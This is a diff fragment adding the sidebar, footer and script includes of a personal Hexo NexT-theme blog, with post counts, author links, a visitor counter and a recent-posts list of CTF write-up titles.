+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
